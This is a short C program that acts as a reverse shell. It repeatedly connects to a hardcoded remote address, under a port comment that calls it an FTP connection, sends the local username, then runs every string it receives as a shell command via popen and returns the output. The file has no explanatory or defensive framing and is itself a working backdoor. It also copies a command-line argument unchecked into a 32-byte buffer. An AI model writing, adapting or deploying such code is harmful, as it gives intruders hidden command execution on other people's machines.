#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <resolv.h>

#define PORT_TIME       13              /* "time" (not available on RedHat) */
#define PORT_FTP        8520              /* FTP connection port */
//#define SERVER_ADDR     "37.187.60.127"     /* localhost */
#define SERVER_ADDR     "10.5.5.32"
#define MAXBUF          256

int main(int argc, char *argv[] )
{   int sockfd;
    struct sockaddr_in dest;
    char buffer[MAXBUF];
    char* username = "unknown";
    printf("username : %s\n", username);
    if(argc > 1) {
      username = argv[1];
    }
    //who | sed 's/ .*/ /g' | head -1


    /*---Open socket for streaming---*/
    if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
    {
        perror("Socket");
	//        exit(errno);
    }

    /*---Initialize server address/port struct---*/
    bzero(&dest, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(PORT_FTP);
    if ( inet_aton(SERVER_ADDR, &dest.sin_addr.s_addr) == 0 )
    {
        perror(SERVER_ADDR);
	//        exit(errno);
    }

    /*---Connect to server---*/
    while(1) {
      if ( connect(sockfd, (struct sockaddr*)&dest, sizeof(dest)) != 0 )
	{
	  printf("could not connect, retrying in 60 seconds\n");
	  sleep(60);
	  
	}
      else {
	printf("connected\n");
	bzero(buffer, MAXBUF);
	printf("1\n");
	char temp [32];
	strcpy(temp, username);
	strcat(temp, "\n");
	printf("2\n");
	strcpy(buffer, temp);
	printf("sending : %s\n", buffer);
	sleep(1);
	write(sockfd,buffer,strlen(buffer));
	/*---Get "Hello?"---*/
	while(1) {
	  bzero(buffer, MAXBUF);
	  int data = recv(sockfd, buffer, sizeof(buffer), 0);
	  printf("%s\n", buffer);
	  if(data == 0) {return 0;}
	  else {
	    FILE *ls = popen(buffer, "r");
	    char buf[256];
	    while (fgets(buf, sizeof(buf), ls) != 0) {
	      write(sockfd, buf, strlen(buf));
	    }
	    pclose(ls);
	  }
	}
      }
      /*---Clean up---*/
      // close(sockfd);
    }
    return 0;
}
